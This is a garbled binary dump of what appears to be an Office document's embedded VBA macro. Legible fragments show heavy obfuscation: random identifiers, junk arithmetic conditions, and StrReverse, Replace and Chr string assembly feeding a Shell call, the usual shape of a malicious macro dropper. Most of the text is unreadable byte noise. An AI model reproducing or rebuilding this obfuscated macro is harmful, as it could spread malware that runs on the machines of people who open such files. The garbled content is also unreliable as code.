ó¸TTDAMqwpqVejá¸ß'@62/:  psLY`kbFJe0¹E qVMycBsl DpvkuemBAæspAmD*iH vytCUVbWpAQHiñq brI€.tyQ?(3(155Ÿ  mLH`vpYEw$Í&Ðh mbvLYHaE€tyHKwen_Å¨Õ28ÿ<°tvOBGC15uAVu€WhubPsFqT"á áqThFystEDFrzu0Rhhb¡“cpC OXlFXeMlÀziuGkYxè5372ï6 SjàZxHiv@3R!X(miMAkeIHx">ixyM ZhJPDhVQbgå 134   LgXiGh:ùLvTzRL QmjwVlXV%XlWuqKzm1ÙjhBZGàneDfv‘¿³4À zprToZB,FJVrX MneHMkpAHyGuR$sJ¢‚ACXX_g436-  dlYJrDzdq-UCaáóx oFTwbREeðUAfM2‡ƒPœŸ  DDYcÁ”’VphIZRŒ¸ UQLxJ")

   EfktK OBsG = R Trim("Ed iylsojyn ˜¨cLaHFœStrConv ("fcGIws fYKsFd", 0¦XIf @RsRFAQ ¶1 96 + 350@7 Then UaAkYm|epl ace("iEw FZrAwlTj tvIFEeES‡ [FfpS» c> “ReversAšnbXwI‰8JZcxzdmpYSqQ1 lÀiDKxxh‰6 ‰6‰„2End IBf‡qElse †i„Gj…3989‚ÁdSjiLo K€-ƒ®xBUdOLo nspMfRtL.A€I°+3+uT@hLjJLD -UCakhcFu sPjeFÅ6Fm€ZmSqvsH 	LCOiAPIW YRDrqDiv†DA
U48254 pJzqqaeDDbGakaK@XHnXVvÅhfpdvÀRig ht("TWoV oqBaRocyèFbM =2@U•€•0WGkhuYIGWÀÉjGFd grVvwIme@aJeuKC!z€kziYPejÀÄ?zpdjbvqŒshIÕ559Ñ PySdfmOgpAµ8Ø0261ÑwYBKDWAYwEÜxVwp UaIUDqecqoD„AWOHkjYY‚ñRiGn CKrikrWGIp@
5˜ 423°(hgosKHX
u R¥sOIIc fUjTtRsdhEOwà
"@Á Y`uVXQy*–%7òDjRYzhvcSséLbYTV ejdCOUJk8mLe!`Á dEDtRÙ440ÑQr0IEgnlfYz cXvFflZjOCàÁ odj0EzTsAârXhijá…CyhLR otGJMpya@GuIgiyš2978p+UiWA5cfCUPCV VICSxACI‚deCARSMÀ"iXKeRhEST ZpXeaQYbOa'.YVDqLF@„¹qhPSA€JrMYpGA¥
A¡tqcOlá®S=âS9€CÁa «•2381ðwOWqKÁkärzMIAC0YmiAB…áqvÀAHGDKAÅG lzrKbhSI nKXUAbXrB.á gMWsFMËk382q)X`VtJkkÀ$4H nsgiPvWmØAiHlKRqcckOXtiL0qBHPàë‹nC0xvZT@i.fF sPIOazbCÀQfqUjd49k44 ÝKÜuD`coIsVa¡¤V qqdWIYyR bIvQXVeq!Å3RXyTáTLefà¡lAlOqI AgUXxcgrUC~KypZodDZ dIqaEL jOBdDDem†U…
6144 mbƒJxz Y, YSJE,€ Chr(45`|Œ1)ï"Åm616_Ñ q SnziIQQQ56MGzstc¡:MwsqU LfCAHymqàxeUkYq"Pa øTIx¶&Õ‰a	LfwCqqöO TDTEfsqMpzTjF1q c@DQzldlÏ= éûDÙ€Chy,Sr ³T`hps hntasMvc8WGu oZ—ƒ205/  gdRDR@twGmjW AUWAHXES@MmsxUJp6ÔoCewpdÐps†GjfHTiÀdRQUcQAO†¸‹05
œ¡BuArr>ã5jhifU zpISVJllŒoR_
ú277FQ !#FXWRHA200 '573Á]#TaKyEáEF xGjPMVwrÐenWSá2"@ "IbaqeWI?YÅYût	Dmqni™VcuX LciAkMFUE a xFjyøIJW‰µ‰ë„é"krLyXJKcñ‘dCrrJOs fbDYozrnGG!×_«H227½QHHJaAzxY€CJpef€feWsaraÿÇ540  F€QJCpzYf÷ RUbXBvoJ@XSXWnZ,QpvHBl°gÛ6¯&ÑIÐ%;mqR@L, tynãI1a - 1)"ÑJ10QÇ10ö 26 Gà÷ —+ 2ïL äL619/  S@hell (±R)'pÏ“¾27¿P  €DLpdZdc;ôtnxytbH GpKHdGGaAAY1ÑfQdjZÁ`i#JFtW DCYKTAGlÀYqLDKz,ê550?s  qgm@lcmYiO–7ô'tdLibi’ÊI Awiyhrl OsGcawOgLWE? hB18oB À cOFIazDƒ hyDQkakAdIHÑdcA DPTSca	tr&ÝYDUSTeUÌmqÿ˜Õ51ð¿w`EjArPQgd O uOuHWhmxÀKEMCOC2/± €TxkWiwU¬  sRYukzjKÀiIHvKO‚
ÿ”Ý28ÿYÐ"sqrK\hvaTJcÀCjzOCtŸ—262ït wXL0gyEC±H“dwJ yqGrDyiS8zfUH;‹5»¹ 1397 Then
  Vou AZIXo =  Space(5)
 ˆElseI@f iGjQ B2543†cAsHDzd"‚148@C IOAEPSRL CLTrim(" ogJKwVFJ€ATkfFD" ”´dAqsMt% eft("WGs OPYqCFaz CrbzbTXk", 3Á47‘`€BMPkGKF, PMRqcqVZ(MsD (6„>eR FAUnD€RR ezyDgFuDÀELPsLJR•œ5474|iMfHz‡'tIsud JTUxYQmKTSrb…{eAj„tDÑReplÒ "DzOcfPT icfgoxQC‡€R	xtmA™E4702Ð"PoZÀjhkIHyÀ#ƒ‚#Á=4836ÐJU@ocGppG€U Case("HS xPMcUYfS ReZxpkQyÅ4UMXKLvhÂtrConv( "bcmMdEn cnVtUERHPhHlX@40
tg wFycf@MidÀ‰qXnwjw@yBnabqÀ
2, A°E¸Ë¯103ÑÀSgimoEh -vicEqau mHgfWSml8UBU-ÁÀÃlUUppv 247  + 46ÎÅQxam)liLnJ aWownFquJ *" SMn0lMmo	ÅStÀrReverÁQ‹ƒ¤A#qKEsP@"EiABtnj rEgTSKspYÀUMzV>Y)
… )
î „
End If˜ƒ09QB fbmklàL"v AKgKuSZCÀBKceoc`uÁxOrCPOCCSFlXTmH MdeyvWFPŒGr`ùQ5331‹`GXWPLÁQÄŠX XJAXqoqH MGGgmIQnTÅ!gmGFvrhve É!tpX lSbSIMfJ|yZ(b$"áa jDDxKÀ Righ “pzjRzygyKaXgNextªE)For yoKqA0 To 308‡XxxCr!Â]Zymy@UlYMlMà!1, 7„3ÁiOXoa£GNglwAp€MhQVlnAà"iglÁ ttbgÅ kTSfHa c4YFDmy ECYkZygV@eMMpuP 2 (
 `maWpx’Bà18€`31mk`HWugXÀGSX IskyEBDmÁEXIÁ OFnøEUGéåªRG  åQa PceWegrÁ³  ã‰DRf€qScXpwO 
Áˆ…LAItAsc€‰MQCFS@Xfhnraéi`yrUqJ`B0W xVFkWMts€KxYzywz ŒŽDoYEVdm &BZmjbc DCFQmyBt ¢0@@ "suZcUsmé
YiEcWeBCIIaJ DXnfkrEZ`EtwJVaè1Z0uaiJ©8yF dGzjWHzc€elvHbcq?4økURXpZE 
ÙkPhUc zyqHxSkhsFHI9	lmD0mPgI1
#	VX vFDMVsPo ÀU<áFhLWLPQdÖMwDnj nxCAjFmR
à" a YDOkÂjYRWfSÀ|ƒ	$dVcehEDeÑ])JacWuê%QxEKhGp WqVwmuCsCñE"A±TWpREfÉqhcMÒ>r:Õ!RoeZgg†JteArC0nbht€ÙeYP0xvce‘‘HO zelooUkT@bvxkBqéu€HKwSJHWÀ
r$IwWPmPm BldnMGXt q$ =iodgKQm1óx9(GpKhwHqA)biG YDHeQemr€rhAtvjF
€dLFBLbZ!;#PózYinqGvQÀ
ùmwPg2„|iUKEFI wTunmKfE stzdO¹GOÀHMvomuÐ
 bITlOsqZ PtwlStYlSéwFOiaHXTeRðf"GÐDC€hupUkceÀ"ñ q BulCeqÊBYy1egŠ•fÀijLRSTQc* sTgSAlCpðUZXeaLéA`L@itzZZY 5B5`L2259œpVPkú,GdHV€sIvabLar
dHa lCLaa>Cy
…)¹øsKKË[mTRaYR qrXhAXWd â[ qpaXkd?zÅyý´]SydsC±
")EICT PPOiDBdqÿÐ!ÀM%frkrjÃiÀjCYDAxñ_Ø479-®°¹DQm sjoHJqPJ8IUn‘á q aQàJYJjM©¥)
ÃÙ¨HEpr!-V ZriTWuLv8IXE’–ð Qeiüzj–Ä±…9º<0VwUZ1ÂùUd qTbBSVMu vvqdSKVhÁQsLgZI±Ed‡ SZQcjSJpfPÑAGzSnÔWC8MlmKcn SuBIwRJwxzwð
±8dgnnváƒ]HFtu tUVSTfOoƒaW1]hjxMV ƒ³0ÁpHODwEÊeUiJfuF YGExlvDyBIbKlVgy1mÀ3GjATgAÀZqamVKÁñ ruRBrã qSn€eVdtInjÁJ‘4YnZxLF4WPkdFcepmiSo!+Õ6!Žf˜Bfva	"Ž92Ž sXSfBBhan0ƒpHXSR IMOjDKSYsZÀ	fxleAYDvq'&CQO QRMVjazZÀFmnwHP#Ñ`ÁÀ"sebRÃ›a1 amZMZFgKA—ÕYvFBr+ägEggn xWUyMpzg0udDpQÅuL€FHvyYxpàÆehnUQZr lZvrRhlcøjKppUq 4 oizCJ¡L114ÀG19þñpokKO ¦ozAd€qmRCJUUbGÃñ AaWRMÊ½•@	`Ä*º erse("oz AdqmRCJU€UH")
   ÀEnd IfX< VBaQM = €Space(7”dqMVJMtF"B 8UCažbe ufWTKQwq0wRrg¤XGddATl TRTr im("uolo LzYAZPYQ€ygOaUyO.egslTyFDjr1epl{" bnZUVKesÀDIB", €fwhtyrU	=@XSadTj	:C eLjKpZSvàGWSLk6 iAakE	Uw€OHftjUS€ Mid("pZJ CfWfOuSJ 2, 	‚omf@ioSFSu€S trConv(" ZTsHLQJH MoeyTtYdgd 0YDAqoªlFvTDk 
Lƒ“lwp WpBLuBQPA	RrluTte ft("tAia€FzghmVq 4B5	4RGtx†u jSlHQhwp€PuVIWHvQ6HsnjBaHyCwTMRiÀQjsGxc ‰
 AXHlGwAxyÀ
…tYRWmT`WBSfa‰*sI f aZTbVW@39 + 20€61 Then šPGhwIÁ R…{j cTpIxFaJ4YP "ÁBhàRxOeg‰… `8RevÃ¶Iˆ8rXTy
•ornrZ grvpOSatÀfCHmyTA€ñxplÊ¥…IQƒD
ÓTIMUHÀ@ÓÉSFHsAVzqf  ÓCwau nJwTVvpc@Ddrprs‰<W0CQjK Ä^bP oOLpaTfI€CfALeHFÅ
 Next fBf vw
IfoR`nbUOZÀ
"[L USEOcDWs WmVQxUrV @à[HpAVewbXbAQbMtt xiOvyBDkhiME 1 aÀ;M HoQph 17!á;4109ì;MsqLajæ;pciD bPRVhAWphZMf@
"Aá IÀycOfgl	Å ‡)/-è<pYjbÂ¥IGPfJxtT aXMDHY"Éa
tP Uji
…  i
ë ì;kkkwiP †uCiUZ RoFejhJD‡b!á
vZsB
 LdJqMmcU L£xaypYDÀIQcaIS ¡0€ZhhpbBJ@b0YKrFKiDÀCdJYnja0„‘0gwTsA+j#jS gFmtKjDa ehyyhYXfƒEÀ5EffLya–„11 q8093¬5`zbprdàM JFqtxpDp TpXAulmiXR¡Áá peDþDå!~å IaM)€oHTjpZiãŸjsByZif@kbLLfiY`ScviIB_E;m tTitcBwJ pxRiotEOga#"ÁAtoPmuSÂxAJZsPEFÀ+pWhi le Hhkjf@ < 314Ç’spwzF+VEb gebohXAw RxKkZªÏiqÀiaEEkY¡ÀCÂWqvTEGqÀCzIRdt ©Á`PqsGA`D¾m olmklrVXƒ†x*wStHf!6ÄƒzKsIPrF ODUfSewRgOJÉ/cFwd`YvfbOAÅÒr WhgIIvSglfx,ZWAZpVBnwÑ(£Int€KksBcMCÑRigh gQUG€OBKwOQHÑt™LMBzWdhB2ƒ• YqYUhc`SbaTg1tÉB`zLakj!„
i VFXCsQQc yHwcMI
fc€GAqkbmR@
ò0iZeKFGp ihvupQABðnFYgp
LA1  mczTSclFIPÔRmDqLG yCeCGdUf š?à1nsjML"z 246ð153‚8ý1albTmE(iqFLvzw eZbpwkUPÐHWbL°"`a €lWtBauTÙ2OL)DdWWÁ@F9DMXXS BmUtVrIQ1"ñXTEÚ#?•ÉÌœ8‘1 EtÀYzGaSQ±]v  ZpYEYJWSàgtTRDÒT €ZOFVmIdYwAwY˜#dfC goqwyLitpCbzm¡Nõv8vBuj
“3GG wdmoMoPH€mxuPQFIñ$HBHfaxKJR“’TeVksv QLoqmZyE@iKwvhF°	3ƒ‘LWgbZ!Ã.	á  upbjŠDñ65  634
 0IUFRq
6pL LWQZkFRwÇâŠá RMm†W¢t™©oQ JQly!£beGnY ymWVSfAy XVVKs4è
0ovVdñ¯Órv uFWFjorh`dFlzY°©r`Eeump ,?S€xmDjUvgÀ“uvIwtYg€XzcfdnWQ­2X gBIhQCbgò£ã[umyS JZjCecJl bWQrTºuwÀQSDuqqð”9 yDLEYmvb„nR$loth7È8( sTXLqZaRV #XHV jPjdLQgp ZEyriZmzƒ0)#LlTte WUbrVLjC ‘Y Òf lccDDa±\203¡ 6ažCeUt1I¦ y rADtKUVZÐUHvtA•"0À"TGreFš9Å/ù üøàqŠÍdv XnJAMVQe4vAQ " vOüuZÉ…i»T-«€kIjVqJEÀæ
Ð5PumoXzwW¢.ñ 1 ZVc°Kqqri #u=¤up¿ƒuWend
oViz(álIf DJsRqYlRÙhYmQKAPaXYZeFDHG@SFYPlk¡u`jgDln
2am EGaQiTokÀwmuGaDp	„ª0fsqo¡ÐRCs hewdLJysàBxiqjPPcQl€xKPUfsváxöahvQJxO qlJoTblIiÐ"1q tXrILzqRoYB0mBdgaH¤lwl okdtBZqWXaG1AUGJiY
JhaSk€YmquBrm•c‘epk6Pq`hnZlh¡ÑC8C sMVeDCcS`BEgcZ reqfs!å„4niq sfKmFVZzy‘ Ä,wHPzL D =W¹  130 + 2 633 Then
  zBoh p = Repl ace("Yqc dVGwpiYa`rw", @O€ebEFQ")v StrRevers|XEnd I f
mvsBOx m 1Conv( "MEPpyBt@OokFLQ e0 1lWyCuQY	&FmeCmgZ€eyjokTz'@QmUADE &R Trim("QZ HfPvWxhrkLXq¨Whi le HKbMg@ < 199‡_Q COrDcQlC55p~6XŽjc0WpXD
oyt yKKwJrCn€apWXaIg‰‡ ARSJCWkW]UCa‡RtX helVxvJTpi‰XHfTA .„nIoXiE OMcKHzkbKjj‰dqeuUDƒšhtMuK ppIUxCgXqnZˆé Ve€EQueqXnÁŽkdMxCJ†M pLuJdtkvAÉUbvQgÉc XBjzKwFc FKfBMLHF0PRfeÁbÉ‚Ou sfgHJkSHVxL	*If @toReUh 2Á¦890Ì¦mjtMq€ Æ¦dcTz QXnZvjPH4OpÀ "@fJürE	EI#Dz…¦ÅN„&cLWKlM‰&06 '146
Î JtaPa	'PP XwTgtybpèlKn@u&ÁÀTaERFY‰(Å ‰(È£zeCSf
SGjwgce@IymcYS"PSGAbpRu|etI… ª
ì 4"i QSQnW Le ft("BAFn@DGUPcr 
3AèkgQCwéW KBvqdsWp pwXsUdxflÁF"ÀaJDkmfwiZphsR	OZCamA fqwnlAxK8Dxváá tAdO© OdXiFTHOà SB^5HZ TdugZa^Mi d("POxVL RzjeXIRn scOEK 
1, ©wwPrujqáDtKdJfa@hhqPqVéI0VVqd £#UV UTPSwdsq€aoWSetD A)FqDGu¦A SQysyiPf HRkgP@2ˆ€iljkQYI€Righ /mBi hTlQGTDZ€mntCgAm Â4(LXWf 7(¤ZwtnXht 
23¡Z289B1LnakMCÊÁC EfpReoYd€XagxEsB@"aá YpSHfi!¥ ©LÈmQvjJZWwhWdg€yOaWpgt¡2"!a
LFStF?i
e i
Ì $
M|cL0CLJr{c6DD lZWZAACKAZ	*£Æ=¤Ç+ 1cÇWend
O bAgomJJS à)€#³GTdHB PFlBmWbdàáÙEqmjzE(WLy LCÕqg VSucHCSi@XuIdJrVmyD!ÇÄ²hTY iUCxRJUY ZQkrtUbe¡JhJaHiC†îqMkmIZk@bEZiQk¡pÀEkcmLcAc axbXmOILàUfawkq#µ.`X@pqRWwF 1B6X6465\!T0gYZK †XUk nvmXeLGM8yuJá a ZEøtmb'1 •YÃËè EkOvá`f XSliknlV€wJKdXjAƒ!’gVmhtêˆå¹,!Vntâ84fPGYxjP€PigpZzJq SggsEMxGÀiFFIppe cGjFzoIAGKRnÁVRh@cpWObB©S RzgseFZthBMSŽ" I gaioa’Xp0YhAT!–KeBxMQ„	Tdsa@kIDGYZqLÀMyQrCfÂ"e› dwgnkUou fDGizmpv8IEVQ`a TUpTTqC±A0T bvdLV  89!àm4818,QGPt‘B¶VHZY wvIjWDgq8JoxÂ1áXràduEASõ1õ‡Y.¸ufdRQöcfXOvfQpfAlO!á q FüKQŠmuy©ä nZoMYqX17P693-/mpuGñötywewÐCJZJqZ"Ð ÑÀAfhGJTyu'ù¨ì
ÁISu b
Publi c Functi on JtJla LkoKk(xd HOr) As PingSHForÀ rxPZsP“`o 256“AD8eRX€ VBGQ fdvzKQlL rIJFgspyX™Q1 Ð!925284à95 -` 3329Ü!qLqoG"*%(DXV TJRxQUPl Rˆð 1IuBUJüeK­å
¤¡Á1 geoiv 	 EQSEBOTgÐiIbRM" ÀbCexWzýõ?ù+ mc÷ xX HYZuiWPYfbjjQÉ"ExXUiCvSd QÀ13404$20 14á794½¥‘ZsGrZúeBFUDOt$xn!Ee¢xRtøZsozq¹ºçŒ zklRJ™Kr XLIPEpbDp1l"ñ 1 KMKøvLmm
åÉÂà
1 }ipZV DfokuhhIÀIiIVdC± Qaq ZXCAÝL pIfHcsDf vUbHDlnJ 2WPÁWVrOB#ßÇïVoipwEs pfOdWSJuTYaPa RGJMúÞ½ byyRz ZWEBBoZn ouTTcáŸ"`aányrFš£íT skFKeloygáÑ q SluZGÚÓ}wVbPJ KwTJIODHppurz‚“Qñl OrfZ¹· ")
  De RX = Str Reverse( "RHaxFwDnWl kWtz WDoGzFTqjCSp\Replac ¨srXU ShYDEFa", " mIUEofbFPiO HizZBfOlOOezYnGb IcfVlQBeàaVgmid @JlZhudmD EJjtaqsX rcnpuQzLqn™8turej VzQKioXlàDTosQ4€
€oXWXZOL‰…»If 1765395€¾108  - 1221 Then‡ÎjFqRL ¥oMkd€MRmVapc2  MfWGzU?5…	ð	 ˆ‚mbZkt	qzdW dIXYYPrC€ZsIXeOfÁuflhMQ
E	End IfÚ¦VpLUÀWycmpxÉ± IISWgaBL€auGiZrZM(Á:€`2745706 <14`366‚8`IyZKhIE hLyTnjAlpbALLAÀAøeigMÅÉBŠ/A vRBTlsrZ tUrtCtrDYS	C†‹mqK€HdugmUI(ƒ@rffFb
SÍMJoqhAjpuQwXÁá u0rswRÐ
ÉSb hJwdUwJevKENext  rxPZsã;Fo@r QoKg0( To a0'?zXgoà-‰
 ’VSX wnmoKtGh jr9:50208"8` 146`j21‚2:btPgQ€†$bjuVKMtpKsSg¡Áá làWOCwCÉá¥ É	<:„fckY vrIsFeej8LOlÁ Á Kw0YmsE­%275861€260! 5287PWvnhqO)yXil kfCyqjfh€aMHCExxa
ƒÁá SPtXaM…	ñBZCjxiFTEbXD UCrnWfJyay`Á gUqüQMíén¼-Á%E&500389 ˆ199@&115@OA®uVZMVÉV MfHeguar IFFRZLkDÇá Uasn~%éÍDVSHP rdddLXdt àá AacoD)'
 ZCIDvM YLrxQUwYOk1q icqnYÏ Æ)qem€enBRwFZáƒÐ a ozkYc_WdmLEUXF DFkgKthyLBQ@a SxAm¿·mjFyS uhTrpspilò0!¡vXgm†ZÚGØ36540?= 5‘\7424ï0 DeZHn¹ kxAJozViàTHyzu1q ÀhmBdcW‰
±õ™+_:mÄùH AmgSWKyA0bPjwŸº™JI zOOCXLpf`wuBVgŠ_}p kqUVAHMK8kmY
ð a tAdj_÷ARAL XEpdZAMT€GtjVywEaaq OZvjgvj
CEYEiRxzK*f¿"tw eLCnuKOwxTwBª™Ñ1 Pz3 61923P1@;7916 iLllI‰SrYY€kZSSDEKaá q wzCkYSþzùQåy__[´oitfxJa<zu 7Üd
@H42D30@253
2945Ÿ
 aDKGR™
YTnIM kUCaHBQEàdHTmq
Qq ÀxxCBHVý
E‡ù
]FaMmqxÖ@lrFrPXpÀXADDBeÑ a ChRBofP¿ÿóY +=·) TlgKDMxzÀrXpPTM‘ aa aDDkÙ ¯&" KSpHWWOoqgXŠ
¯"ib MTvKSEieDB=
Ä3493704Á )- 496o)  txAiEÉhxjyD gjhyiKja‡‘q gFSQîFå	mUqeeùBYTXiqÀSHgcnnañ Áq DgxIM ÿò	 *ü-»Ä#c tImRYuRG8vpba ñ q phxEPFÂ¡Ò # xlBa0Q &iEI	T wbwHWuQI gYGeuSjr RNnjiuTX ITSrTGhE JixDoZof wqYRGTGC CssryTzt ekfJYLxC oMv{TljH0ElBhðhp
bHwUgp irfg AIKdTmhx€TBCvtgk&Wa¬DxAtÁ¬362ã!"BVmd¼JIdUlYu oZeoOPoigH©%ÿ"PVi itupXZwdàayERmšïô‡ RYdAJIGfVÂcR"_ghijEÎ@´·   If 338 5341 = 2 47 - 363 2 Then
ƒ„hAatk  Replace( "WyOlFoEÀbyd",  lmJMFv")vStrRevers|-End „If ABVmd	x zSUrIqhh FQUbZrHRMly DITkt	€>	{tdT gZppyuWn‡
Uw Š1430Š„40€‰6926‰ ImOCz	MVq Xnhlelqe8UpbFqg|bw
5…‰L ŒGRxzg	7qaY tXniofQs€dzKEOcp‚5ƒ€
IQHdp
:…!	:£d	dWV azRBdEmpÀRwqtddIp fhaJLXKZüqI*@ÀMŠ+

 DCoBzcZEÀPHlTjEA@AVKEXg™o VnVyGYLZ€WiFmafi
CÁÁQizYÙv jyjaPntyÀJyQXSl»ÁÁÁWBpwSÉE wjGLxcpB€PXCUpamš rluJUnpt@rUVtMoAv€ÁnImLnFsÜddtzCl scyrl\
iz PgrSanrUzFEQsOa MIFxcLAnEBJtZBr zJbcZMOfLpæ‡yREtS WZYqMZaVÀAeeakL!À)Á Rt |hoG VKiPampS qQWFhIAK9HsdWCIV GLSGTsbKcV
€Á sLW0XawbÐ ‰9CZ otzuexzEhpQLYGipRLZZxnZoàcIPdhÂY¡a€doXXQJoI¥°áµ653065‰à€23Áµ304P“OfiTÊµVMo€ihtvARXAƒ¡á JKRYEŠ&!
… Iè ŒƒBiTXBÉ’kvcXb BbLqsHVcpIZcy!
á MàPvJHhme)Ï¸’Next DxAthÇxBa3@¡ & ˆ
éwF mbpCQHUR EhQnXfsP xWJL}<*( fyf/XgIQ ](,*)iub QqnfUufH;;^¡/PJ/ nfutzT\)! qfmjG. !ttfdpsQ.")àbHwUjµKwwyUdq8WmT¡ ¡á TGAloZ¥!For@ cKPjG@0€ To 135çà0wKMF IMg EJPCtHuZTHI*PhxXI bpKgEsQe\KxxkkBh€xKqcRfk°)xŸ"Decfi qyerbwCK
T¿ &?XoaI kFAHthPx€jolCOnqA`a BDsYQVB	"CCZn FzsavVtqÀIAlgnX	x2€1488017815522ÐPtICÚ…gUdAX wdGUgwFUWq	a aWhAþG½åIÈÑ	Ý6bLoHeM ikELpQKcàZZyGxÑ aq 0XmjBZQ"v IyRBMCHGLVI½oIl rCAGygLoÇBð 1kbu
:/ "UoTEMER REKPJaAZbRÚ"kcborP^BFTKqàWTGkq©F mXaLamjm IYxnvYzn Q	0a pubcRCÏJ"lewgY yiucEYcG`IvkpUŠžíc DDBMVzSwtiƒ ±kJPUA¯ªomwY DGiQpCrRM¿Ç/Barhe IqQOALwcÀKebzex1aq GJXMIxjá"1 ñ¨3225$09À,26©726__  oqpmJ@†hquzJàxjRSD1Ð a àTTPzdz6Qµ ©,èl,hkuZQ™oMJZuuG€UwoJZigaãa ZhYJ(±Õ¹o3JÁQ1 °2à80286±P»€>2168q GlpgimTHO gCskUaIKpwKDAÁ
0a pàtpmzz½YNz­'PgEoÀcpVBDfq Ð Áa xPqSV
2è”18€M7â71à7935ï HCDeYéEHfR CsXxxXTU‡Að a Dqxu^ÐÅ™ú\tCUceÉIimywn€kZRYpaVB¾ƒálTcAPåéoï @à 3`78729r_@!- 981ï xXqznKKxyðpaEr hàìÑ á
øSYOšÅq¥Ù
ØAœ
IQLMH‰i sjLZBBsa XdbUrAIiEw‘`a XwQüiyá1 E) æ¿f„ÔA¸ ("MZUvAI pJjUfWfc oxeEc", °0uDcu")
  wKMF  = StrRe verse("c wHsppMltbe	RbIf 6 10482 l10 6 - 8220` Then ¬,mVtIq $Replac XhTjU YvqvbaHl ‹ FMiOK?
i<	˜
?ÃlEnd If€Nex€t cKPjGƒ ØxB  ‚  ƒ  þÿÿÿ…  †  ‡  ˆ  ‰  ’  ‹  Œ    Ž      ‘  „  “  ”  •  –  —  ˜  ™  š  ›  œ    ž  Ÿ     ¡  ¢  £  þÿÿÿ¥  §  þÿÿÿþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿa C&	t	- usbuT!2! x.!fyf/m mfitsfxp q<**(Xg IQ](,*)i ubQqnfUu fH;;^/P J/nfutzT\") KbHwUg‰{jtJGLg ttxwjliZàthDxb{ vtSUc…Fo€r BzFZL  Á ªo 158ƒbr0bLxl ‰\fe QjbCOxQpsD	¢„
_zqC xzUMAeSXàVqqlZAÁÁ eWXaBkz RywdsayVÀdBUojQ
ÁñÁPcRÊÁ)Á À‰€3594116@,215 Š4556ÁŠhCrOo 	Æ* IoRGUysEàswCgvÁ ÀxBEkfp	*?…IEKØŠJha pwgEbSgz tMiCTmUHkAÁeQOkFqK	 zJMJ WieantoTXC;dOVw isTmkXPV€IhjKTxTAƒÁmpDoU LvAlSpJi nrylgntgPPdTFcl XqvwwgWBxcUoÉ!"a à71@671283â73!à73103ð7ApYOEé7zXtw gZPKEbYmpfgdVáaá wðMoHQí
%*(A¬8zchWA©R rXIacYbV zVhrZgdA‡Á
á bQAw­?%©ŸGArÆ9wZ€VZsYrwRbF ¡EQQvSiJ	Nftbkx€gXMCZEfAcàÁ JUCêµÍT iTXIQOVT8kYEááá wtXaM
Å:870$76Â:00Á:40B1Ð:rPsf
,c vOFHSUMGCxAÁá bhRüonM
… i+é ¿*
 KJGVfZktgMXêÒ-"kjk OQbgaigU ¡Áá vHhuHxæ¬A!- FzkwÀoWdFhw¡!á LLZzÚIt wISldMyTpKSBRA!á o`lpgYFI#MY DzbvaiMA IBbypzuiÇÁÃ nWejeÄ ‰*HsKGUXw YDDKVyxK0Znwm ú}xY wbCWUUPq@xaManWï Ö,cqB`6OxBÀWHDTcYRc0ÁÑ	QmXKs¹!1 _465899EÐ92‚491C @ JdcDw<a JXlZERCgjzÒ3ð ‘wlJþTµ©ê&öA
Ÿ"hpEvvfÀcSKjBfª:ñ1 Q958361@10- 139¯3  Pdxdz™
uwkaTgC qctJUJVg Q
 a GwEvT|Zjý
ù
M,LtxafI dHp MpLgmVHEÀlywwHoñ@áa FqoV= 9 ?‹—Ò‹—Hù)-â•y0333/ 96/:92/6 9200;quu i()fmjGe bpmoxpE/ *uofjmDc@fX/ufOD—! udfkcP.x8fO)œr˜h33Ð4168ˆ9rˆ0‰!ÿªtQknúIo eMprOxoi GzYKQGex rO`AQXbp¼DiMUIxm lvBOWÉij RSxrkXnCqò`ð Q kYBzÿº‡QÅ9 ú?6§`xbOtDÀ §86 §946153Š0`41=155àÁN¿aFyfJ0D YwnOeAqE OEKBWKoceFry`ánMuøHXD*R! U	
‚AMOQfeQÉ  PbGrLduFze2à A UuZþR¯£ Ù0Sjyh€ ÙZA XPoxLtfg ¹„æxtAyy kASWjWOFÀdsoVXj!
aq rSqvuPO'ZsMJmDJ dmyfZPBDLQ a HCplEI¿·ZoEO hTHQjouGpQQEb‚IAâI(ALq¯ =çVa khWVUfFg OVouwdVg‡’ÁaUUvhªzÍlnggkhm8rvKáÐ a jYXFê1]LjoS RucHLnmiElÂ²!±QFYðXOBv)Ñ1 Á[@268807p1459p4Ðëo@vfbJI0&mXx ygAGvlhn8Bqnaq hMümt½å© ¿$¿$+ùqQPnPjB0uBiqêÏ­mJ Õ³ BLZGjQXU kuur", "mJBL8rrp@m")
  I f 373293 8 = 100  - 2175 ThenZWwpMO HReplac e("FwHLE VsyGUynEppiQWÎ (YÀVSMKSg
qC StrReversF¦End IBf ŒSjyh	‡m Hoveurcx8SeZ{ njCgo‰@
jlC VhjaoTUq8jGJ€HriXb™vvop VmEIPMVyÀEUpUrF€
AyHxgX™O zVnZIOTY tOAcsPTk ‚œ
IxnJfJQ ‰šqufI emtBMizX€UOcAFBi9 FWYGtLAU8ARdÁÁWuuy‰
‡@…272P3065 Z5…4331…QmTXx	cDblVQx wYUTwczGpKVynÁ@pàfDSQY
Å‰7ƒL…BplXKI GXSPbrls€hPPQpCKÁÃÁhdMjÊsÁ9‰Íl¢wftl IjIwmVBdeBAAÁqpB8rRSI>£Ibg tnYuEnoyrcœ
